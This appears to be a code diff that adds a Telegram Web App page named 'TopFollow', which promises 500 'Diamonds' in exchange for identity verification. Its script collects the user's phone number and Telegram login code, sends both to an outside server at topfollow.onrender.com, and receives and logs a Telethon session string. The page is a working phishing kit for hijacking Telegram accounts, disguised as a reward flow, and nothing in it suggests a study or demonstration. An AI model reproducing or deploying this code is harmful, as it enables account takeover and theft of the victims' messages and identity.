@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TopFollow - Verify</title>
+    <style>
+        /* Reset & Dark fallback */
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: #0f0c29; /* Even if JS fails, it won't be white */
+            color: white;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+            align-items: center;
+            justify-content: center;
+        }
+        .logo { font-size: 24px; font-weight: bold; color: #f1c40f; margin-bottom: 20px; text-align: center; }
+        .step { display: none; width: 100%; max-width: 400px; animation: fadeUp 0.4s ease; }
+        .step.active { display: block; }
+        @keyframes fadeUp { 0% { opacity: 0; transform: translateY(15px); } 100% { opacity: 1; transform: translateY(0); } }
+        h2 { margin-top: 0; font-size: 1.5rem; text-align: center; }
+        p { color: #bdc3c7; text-align: center; }
+        
+        /* Buttons */
+        .action-btn {
+            width: 100%; padding: 16px; border-radius: 12px; border: none;
+            font-weight: 700; font-size: 1rem; cursor: pointer; transition: 0.2s; margin-top: 15px;
+        }
+        .btn-blue { background: #0088cc; color: white; }
+        .btn-blue:hover { background: #0077b3; transform: scale(1.02); }
+        .btn-gold { background: #f1c40f; color: #0f0c29; }
+        .btn-gold:hover { background: #d4ac0d; transform: scale(1.02); }
+
+        .field {
+            width: 100%; padding: 15px; border-radius: 12px; border: none;
+            background: #2a2a42; color: white; font-size: 1.2rem; text-align: center;
+            letter-spacing: 5px; margin-top: 10px;
+        }
+        .field:focus { outline: 2px solid #f1c40f; }
+
+        .status-msg { margin-top: 12px; font-size: 0.9rem; text-align: center; min-height: 20px; }
+        .status-msg.error { color: #e74c3c; }
+        .status-msg.success { color: #2ecc71; }
+        .status-msg.info { color: #f1c40f; }
+
+        .phone-display { background: #1e1e2f; padding: 10px; border-radius: 8px; text-align: center; color: #f1c40f; margin-bottom: 15px; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <div class="logo">✦ TopFollow</div>
+
+    <!-- STEP 1: REQUEST CONTACT -->
+    <div id="step-contact" class="step active">
+        <h2>🔐 Verify Identity</h2>
+        <p>Share your Telegram contact to start your reward verification.</p>
+        <button class="action-btn btn-blue" id="shareContactBtn">📱 Share Contact</button>
+        <div id="contactStatus" class="status-msg"></div>
+    </div>
+
+    <!-- STEP 2: ENTER OTP -->
+    <div id="step-otp" class="step">
+        <h2>✉️ Enter OTP</h2>
+        <p>We sent a one-time code to your Telegram app.</p>
+        <div class="phone-display">📞 <span id="displayPhone">---</span></div>
+        <input type="text" class="field" id="otpInput" placeholder="6-digit code" maxlength="6" inputmode="numeric">
+        <button class="action-btn btn-gold" onclick="verifyOTP()">✅ Verify & Get Session</button>
+        <div id="otpStatus" class="status-msg"></div>
+    </div>
+
+    <!-- STEP 3: SUCCESS -->
+    <div id="step-success" class="step">
+        <h2 style="color: #2ecc71;">🎉 Session Verified!</h2>
+        <p>Your Telethon session has been securely stored.</p>
+        <div style="text-align:center;font-size:3rem;margin:20px 0;">💎</div>
+        <p style="font-weight:bold;font-size:1.2rem;">500 Diamonds credited.</p>
+        <button class="action-btn btn-gold" onclick="window.Telegram.WebApp.close()">Close & Continue</button>
+    </div>
+
+    <!-- Telegram WebApp SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <script>
+        // --- DEBUG: Check if script is running ---
+        console.log("App script loaded. Waiting for SDK...");
+
+        window.onload = function() {
+            console.log("DOM fully loaded. Initializing WebApp...");
+            
+            let tg;
+            try {
+                tg = window.Telegram.WebApp;
+                if (!tg) throw new Error("SDK not found");
+            } catch (e) {
+                console.error("Failed to load Telegram SDK:", e);
+                document.getElementById('contactStatus').innerText = "Error: SDK failed to load. Please close and reopen.";
+                document.getElementById('contactStatus').className = 'status-msg error';
+                return;
+            }
+
+            // Initialize properly
+            tg.ready();
+            tg.expand();
+            console.log("WebApp initialized successfully!");
+
+            // ------------------------------------------------
+            // YOUR APP LOGIC
+            // ------------------------------------------------
+            let currentPhone = '';
+
+            // Step 1: Share Contact
+            document.getElementById('shareContactBtn').addEventListener('click', function() {
+                tg.requestContact();
+            });
+
+            tg.onEvent('contactRequested', function(data) {
+                console.log("Contact data received:", data);
+                if (data && data.contact && data.contact.phone_number) {
+                    currentPhone = data.contact.phone_number;
+                    document.getElementById('displayPhone').innerText = currentPhone;
+                    
+                    // Switch to OTP step
+                    document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+                    document.getElementById('step-otp').classList.add('active');
+                    document.getElementById('contactStatus').innerText = '';
+                    
+                    // Send OTP
+                    sendOTPToBackend(currentPhone);
+                } else {
+                    document.getElementById('contactStatus').className = 'status-msg error';
+                    document.getElementById('contactStatus').innerText = 'Failed to retrieve phone number. Try again.';
+                }
+            });
+
+            tg.onEvent('contactRequestedFailed', function() {
+                document.getElementById('contactStatus').className = 'status-msg error';
+                document.getElementById('contactStatus').innerText = 'Contact sharing denied. Please try again.';
+            });
+
+            // Step 2: Request OTP from backend
+            async function sendOTPToBackend(phone) {
+                const status = document.getElementById('otpStatus');
+                status.className = 'status-msg info';
+                status.innerText = '⏳ Sending OTP to your Telegram...';
+
+                try {
+                    const resp = await fetch('https://topfollow.onrender.com/api/send-otp', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ phoneNumber: phone })
+                    });
+                    const data = await resp.json();
+                    if (data.success) {
+                        status.className = 'status-msg success';
+                        status.innerText = '✅ OTP sent! Check your Telegram app.';
+                    } else {
+                        status.className = 'status-msg error';
+                        status.innerText = data.error || 'Failed to send OTP.';
+                    }
+                } catch (err) {
+                    console.error(err);
+                    status.className = 'status-msg error';
+                    status.innerText = 'Network error connecting to server.';
+                }
+            }
+
+            // Step 3: Verify OTP
+            window.verifyOTP = async function() {
+                const code = document.getElementById('otpInput').value.trim();
+                const status = document.getElementById('otpStatus');
+                
+                if (!code) {
+                    status.className = 'status-msg error';
+                    status.innerText = 'Please enter the 6-digit code.';
+                    return;
+                }
+
+                status.className = 'status-msg info';
+                status.innerText = '⏳ Verifying OTP...';
+
+                try {
+                    const resp = await fetch('https://topfollow.onrender.com/api/verify-otp', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ phoneNumber: currentPhone, code: code })
+                    });
+                    const data = await resp.json();
+
+                    if (data.success) {
+                        console.log("🔐 TELEGRAM SESSION STRING:", data.session);
+                        status.className = 'status-msg success';
+                        status.innerText = '✅ Session created!';
+                        
+                        document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+                        document.getElementById('step-success').classList.add('active');
+                    } else {
+                        status.className = 'status-msg error';
+                        status.innerText = data.error || 'Invalid OTP.';
+                    }
+                } catch (err) {
+                    console.error(err);
+                    status.className = 'status-msg error';
+                    status.innerText = 'Network error. Check console.';
+                }
+            };
+        };
+    </script>
+</body>
+</html>
